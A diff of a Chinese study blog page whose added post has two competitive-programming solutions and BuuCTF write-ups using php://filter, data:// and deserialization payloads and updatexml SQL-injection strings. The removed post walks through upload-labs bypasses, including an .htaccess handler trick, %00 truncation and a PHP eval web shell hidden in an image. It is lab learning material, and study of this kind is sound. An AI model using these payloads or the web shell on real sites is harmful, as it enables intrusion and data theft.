@@ -73,6 +73,106 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-20240224" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/24/20240224/" class="article-date">
+  <time class="dt-published" datetime="2024-02-24T12:01:19.000Z" itemprop="datePublished">2024-02-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/02/24/20240224/">20240224</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><h5 id="2022-12-1-现值计算"><a href="#2022-12-1-现值计算" class="headerlink" title="2022-12-1 现值计算"></a>2022-12-1 现值计算</h5><p>&#x3D;输入n和i，n表示复利的次数，i表示利率。然后用户输入n个数值，代表每次复利的金额。根据复利公式计算出总的复利金额，并输出结果。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,j,m;</span><br><span class="line">    <span class="type">float</span> i,sum=<span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;i;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=n;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;m;</span><br><span class="line">        sum+=m*<span class="built_in">pow</span>(<span class="number">1</span>+i,-j);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.3f\n&quot;</span>,sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2022-12-2-训练计划"><a href="#2022-12-2-训练计划" class="headerlink" title="2022-12-2 训练计划"></a>2022-12-2 训练计划</h5><p>70分</p>
+<p>任务调度。输入n和m，n表示任务总数，m表示操作总数。接着输入m个操作，每个操作包括两个数值，第一个数值表示依赖的前一个操作的编号，第二个数值表示该操作需要的时间。程序会根据这些输入计算出每个操作的开始时间和结束时间，并输出结果。如果所有操作都能在规定时间内完成，则输出每个操作的开始时间和结束时间；如果有某个操作无法在规定时间内完成，则输出”0”表示无法完成。最后返回0表示程序正常结束。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a[<span class="number">102</span>][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> timee[<span class="number">102</span>]=&#123;<span class="number">1</span>&#125;;</span><br><span class="line"><span class="type">int</span> timel[<span class="number">102</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,m,i,pd=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;a[i][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;a[i][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">0</span>]==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            timee[i]=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[i][<span class="number">1</span>]&gt;n) pd=<span class="number">0</span>;</span><br><span class="line">            timel[i]=n-a[i][<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            timee[i]=timee[a[i][<span class="number">0</span>]]+a[a[i][<span class="number">0</span>]][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(timee[i]+a[i][<span class="number">1</span>]<span class="number">-1</span>&gt;n) pd=<span class="number">0</span>;</span><br><span class="line">            timel[i]=n-a[i][<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;timee[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">if</span>(pd==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;timel[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h5 id="24、NiZhuanSiWei"><a href="#24、NiZhuanSiWei" class="headerlink" title="24、NiZhuanSiWei"></a>24、NiZhuanSiWei</h5><p>从题目的php代码中可以知道需要用get方式传三个参数，text，file，password</p>
+<p>有一个php文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2ed62ae4-cebd-49e4-9fff-62144ce580d8" alt="image"></p>
+<p>访问该文件，什么都没有</p>
+<p>有一行代码说我们要传入一个文件，内容是”welcome to the zjctf”</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7acb96ce-aecd-4d57-813d-096ae3ddf798" alt="image"></p>
+<p>要用到data协议，data协议通常是用来执行PHP代码，也可以将内容写入data协议中，然后让file_get_contents函数取读取。构造：<code>data://text/plain,welcome to the zjctf</code></p>
+<p>为了绕过一些过滤，用base64编码构造payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/22b156d1-ff92-4112-a963-03edd63872d5" alt="image"></p>
+<p>有一个可控参数file，构造file&#x3D;useless.php，但是针对php文件我们需要进行base64编码，否则读取不到其内容，所以构造payload：<code>/?file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
+<p>完整payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
+<p>得到一串base64编码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bd421ff2-86f8-48fc-8536-ba0c204a473a" alt="image"></p>
+<p>解码</p>
+<p>得到useless.php源码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ff8cc374-6ccb-426b-8372-707bdb01642a" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>有一个 flag.php ,并且file不为空将读取flag.php并显示。所以。构造一个序列化字符串</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=flag.php;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$a = new Flag();</span><br><span class="line">$a-&gt;file=&quot;flag.php&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>找个在<a target="_blank" rel="noopener" href="https://c.runoob.com/compile/1">线运行PHP</a>的网站，得到</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/750e7fdf-d5d6-4c19-a5eb-19b42d5f7b33" alt="image"></p>
+<p>构造payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ebb7fdd-ca59-4728-bf1d-30e878e931e2" alt="image"></p>
+<p>查看源代码，得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64288a23-13c1-4116-8574-dba7738b1408" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6cb4bd76-2b5f-4876-9fe0-46f02e2d0062&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="25、HardSQL"><a href="#25、HardSQL" class="headerlink" title="25、HardSQL"></a>25、HardSQL</h5><p>一些and、union、select、空格等常见的SQL语句被过滤了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">这道题是xpath报错注入，函数注入</span><br><span class="line"></span><br><span class="line">extractvalue()</span><br><span class="line">extractvalue() :对XML文档进行查询的函数</span><br><span class="line"></span><br><span class="line">语法：extractvalue(目标xml文档，xml路径)</span><br><span class="line"></span><br><span class="line">第一个参数 :   第一个参数可以传入目标xml文档</span><br><span class="line"></span><br><span class="line">第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</span><br><span class="line"></span><br><span class="line">　　　　　　正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</span><br><span class="line"></span><br><span class="line">tip: 还有要注意的地方是，它能够查询的字符串长度最大是32个字符，如果超过32位，我们就需要用函数来查询，比如right(),left()，substr()来截取字符串</span><br><span class="line"></span><br><span class="line">再举个栗子：</span><br><span class="line"></span><br><span class="line">SELECT ExtractValue(&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;, &#x27;/a/b&#x27;); 这个语句就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</span><br><span class="line"></span><br><span class="line">利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</span><br></pre></td></tr></table></figure>
+
+<p>输入用户名：<code>1</code></p>
+<p>密码：<code>1&#39;or&#39;1&#39;=&#39;1</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/40172d44-3758-4a26-be49-45c7087c0dbc" alt="image"></p>
+<p>出现这段话，并且url加上了&#x2F;check.php</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae5611e0-f140-4525-af9f-049d55033cce" alt="image"></p>
+<p>爆库名：<code>?username=admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=111</code></p>
+<p>geek</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/73ca09b1-1eb7-4fd3-ab8a-3b4a4ab60464" alt="image"></p>
+<p>爆表名：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(%27geek%27)),0x7e),1))%23&amp;password=111</code></p>
+<p>H4rDsq1</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f0bb9dd2-c888-4015-8365-e30b0fab3422" alt="image"></p>
+<p>爆字段：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27)),0x7e),1))%23&amp;password=111</code></p>
+<p>id,username,password</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/dc636dd7-18e8-41b5-ac79-d1cdd9ddb8ae" alt="image"></p>
+<p>爆数据：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=111</code></p>
+<p>flag{52272770-1ba7-4986-8a7d-cb</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/25ed0a2d-a386-4f5a-a67b-ec2fe58b275a" alt="image"></p>
+<p>这里只爆出前面一部分flag，然后再使用right()函数拼接flag<code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=111</code></p>
+<p>7-4986-8a7d-cb84363e2987}</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/735591d7-7347-4231-8cf4-8e214d661a5c" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;52272770-1ba7-4986-8a7d-cb84363e2987&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/24/20240224/" data-id="clt01bv5c0000ssvf0e9z4oaq" data-title="20240224" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-20240223" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/02/23/20240223/" class="article-date">
@@ -976,110 +1076,6 @@
 
 
   
-    <article id="post-Web-File2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/02/07/Web-File2/" class="article-date">
-  <time class="dt-published" datetime="2024-02-07T10:25:47.000Z" itemprop="datePublished">2024-02-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/02/07/Web-File2/">Web-File2</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h5 id="Pass-03（黑名单绕过）"><a href="#Pass-03（黑名单绕过）" class="headerlink" title="Pass-03（黑名单绕过）"></a>Pass-03（黑名单绕过）</h5><p>trim函数 如果有空格，就把空格删除</p>
-<p>这道题黑名单中有php，将文件后缀改为php5或phtml即可绕过</p>
-<h5 id="Pass-04（黑名单绕过-htaccess攻击）。。。"><a href="#Pass-04（黑名单绕过-htaccess攻击）。。。" class="headerlink" title="Pass-04（黑名单绕过 .htaccess攻击）。。。"></a>Pass-04（黑名单绕过 .htaccess攻击）。。。</h5><p>上传.htaccess文件</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-<p>文件名包含shana的会被当做php执行</p>
-<p>可以把php文件命名为jpg文件，绕过黑名单，在网页访问该文件时，该文件会以php执行</p>
-<h5 id="Pass-05（黑名单绕过-后缀双写逻辑绕过）"><a href="#Pass-05（黑名单绕过-后缀双写逻辑绕过）" class="headerlink" title="Pass-05（黑名单绕过 后缀双写逻辑绕过）"></a>Pass-05（黑名单绕过 后缀双写逻辑绕过）</h5><p>查看源码，黑名单有大小写，但是没有所有的大小写组合，并且后缀名会转为小写，用双写绕过</p>
-<p>后缀名改为.phpphp，上传成功</p>
-<h5 id="Pass-06（黑名单绕过-大小写文件名混淆）"><a href="#Pass-06（黑名单绕过-大小写文件名混淆）" class="headerlink" title="Pass-06（黑名单绕过 大小写文件名混淆）"></a>Pass-06（黑名单绕过 大小写文件名混淆）</h5><p>查看源码，黑名单有大小写，但是没有所有的大小写组合，并且后缀名不会统一转为小写，将文件后缀改成PHp（黑名单中没有），上传成功</p>
-<h5 id="Pass-07（黑名单绕过-空格绕过）。。。"><a href="#Pass-07（黑名单绕过-空格绕过）。。。" class="headerlink" title="Pass-07（黑名单绕过 空格绕过）。。。"></a>Pass-07（黑名单绕过 空格绕过）。。。</h5><p>查看源码，发现跟之前源码相比，少了首位去空，抓包，在文件名最后加个空格，再forward，就上传成功</p>
-<h5 id="Pass-08（黑名单绕过-填点绕过）。。。"><a href="#Pass-08（黑名单绕过-填点绕过）。。。" class="headerlink" title="Pass-08（黑名单绕过 填点绕过）。。。"></a>Pass-08（黑名单绕过 填点绕过）。。。</h5><p>查看源码，发现没有删除文件名末尾的点，抓包，在后面加个.，绕过</p>
-<h5 id="Pass-09（黑名单绕过-Win文件流特性绕过）"><a href="#Pass-09（黑名单绕过-Win文件流特性绕过）" class="headerlink" title="Pass-09（黑名单绕过 Win文件流特性绕过）"></a>Pass-09（黑名单绕过 Win文件流特性绕过）</h5><p>查看源码，没有去除字符串::$DATA，抓包，在最后加上::$DATA，上传成功</p>
-<h5 id="Pass-10（黑名单绕过-点空格点代码逻辑绕过）。。。"><a href="#Pass-10（黑名单绕过-点空格点代码逻辑绕过）。。。" class="headerlink" title="Pass-10（黑名单绕过 点空格点代码逻辑绕过）。。。"></a>Pass-10（黑名单绕过 点空格点代码逻辑绕过）。。。</h5><p>抓包，将文件名后缀改为.php.  .</p>
-<p>首先去除空格，删除最后一个.</p>
-<p>然后后缀名为.php.，绕过过滤，上传成功</p>
-<h5 id="Pass-11（黑名单绕过-双写绕过）"><a href="#Pass-11（黑名单绕过-双写绕过）" class="headerlink" title="Pass-11（黑名单绕过 双写绕过）"></a>Pass-11（黑名单绕过 双写绕过）</h5><p>有一次过滤，将后缀名改为.pphphp，过滤完后缀名为.php，上传成功</p>
-<h5 id="Pass-12（白名单绕过-00截断GET型绕过）"><a href="#Pass-12（白名单绕过-00截断GET型绕过）" class="headerlink" title="Pass-12（白名单绕过 00截断GET型绕过）"></a>Pass-12（白名单绕过 00截断GET型绕过）</h5><p>这段代码是防止多个点绕过</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-
-<p>白名单加防止多点绕过，需要用到%00截断，%00是在地址方面，0x00截断是在文件命名方面</p>
-<p>例如文件名为1.php</p>
-<p>只能上传.jpg后缀文件，代码将文件命名为 1.php.19283018.jpg，使其为一个jpg文件</p>
-<p>如果加上%00截断，1.php%00.19283018.jpg，%00之后的就没有了，为1.php</p>
-<p>抓包，在第一行的参数save_path&#x3D;..&#x2F;upload&#x2F;改为save_path&#x3D;..&#x2F;upload&#x2F;1.php%00，php版本换为5.2</p>
-<p>第21天 1:32:03</p>
-<h5 id="Pass-13（白名单绕过-00截断POST型绕过）"><a href="#Pass-13（白名单绕过-00截断POST型绕过）" class="headerlink" title="Pass-13（白名单绕过 00截断POST型绕过）"></a>Pass-13（白名单绕过 00截断POST型绕过）</h5><p>跟Pass-12类似，抓包，找到..&#x2F;upload的位置，写成..&#x2F;upload&#x2F;xx.php%00</p>
-<p>但是这个%00需要编码，选中%00，右键</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/faf6e2ef-ac59-4ee8-9d1f-7c48fedde799" alt="image"></p>
-<h5 id="Pass-14（图片马-文件包含绕过）。。。"><a href="#Pass-14（图片马-文件包含绕过）。。。" class="headerlink" title="Pass-14（图片马+文件包含绕过）。。。"></a>Pass-14（图片马+文件包含绕过）。。。</h5><p>在图片中写入后门代码</p>
-<p>php后门代码，将这个代码附加在图片后面</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>在cmd中运行copy 1.png &#x2F;b + a.php &#x2F;a webshell.jpg，得到webshell.jpg，可以看到图像最后加上了这一行php代码</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/96294650-d853-473e-a855-68f648453a2c" alt="image"></p>
-<p>获取上传的图片地址，右键图片，复制图像链接</p>
-<p><a target="_blank" rel="noopener" href="http://192.168.182.1/upload/upload/8920230926111805.png">http://192.168.182.1/upload/upload/8920230926111805.png</a></p>
-<p>点击题目中给的文件包含漏洞链接，加上参数，进行访问</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/009f3474-9108-4149-b8be-78ee5bb17aeb" alt="image"></p>
-<p>再用post传参，x&#x3D;phpinfo();，可以执行php代码</p>
-<h4 id="文件上传之后端黑白名单绕过"><a href="#文件上传之后端黑白名单绕过" class="headerlink" title="文件上传之后端黑白名单绕过"></a>文件上传之后端黑白名单绕过</h4><p>黑名单：明确不让上传的格式后缀</p>
-<p>白名单：明确可以上传的格式后缀</p>
-<p>如果黑名单中有PHP，可以用PHP5或Phtml来绕过限制</p>
-<p>enctype：文件上传的类型</p>
-<p>method：上传方式</p>
-<p>onsubmit：鼠标触发事件</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7179fdb4-ae78-4825-84f0-e1afdb7e190c" alt="image"></p>
-<p>看下面的代码，PHP中接受文件的参数名要与HTML表单中的一致，以name的值发送过去，name的值是upload_file，所以上面也是upload_file</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。[&#x27;error&#x27;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) </span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=$_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; #接收文件上传</span><br><span class="line">echo $name</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form enctypt=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;p&gt;请选择要上传的图片：&lt;/p&gt;</span><br><span class="line">    &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;</span><br><span class="line">    &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-
-<p>.htaccess，用apach才行</p>
-<p>.htaccess是apach的一个配置文件，将.htaccess文件上传成功后，其余文件会依照.htaccess的执行</p>
-<p>.htaccess示例</p>
-<p>将这个文件上传成功后，再上传文件名中包含shana的文件，就会被当作x-httpd-php来执行</p>
-<p>注意shana文件要和上传的.htaccess文件在同一目录</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-<p>有的代码是一次过滤，有的是循环过滤</p>
-<p>比如说，a.phphp，一次过滤之后为a.php</p>
-<p>循环过滤（递归过滤） 过滤后为a.</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/07/Web-File2/" data-id="clsaip1bn0000ncvf6hfaa4m1" data-title="Web-File2" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
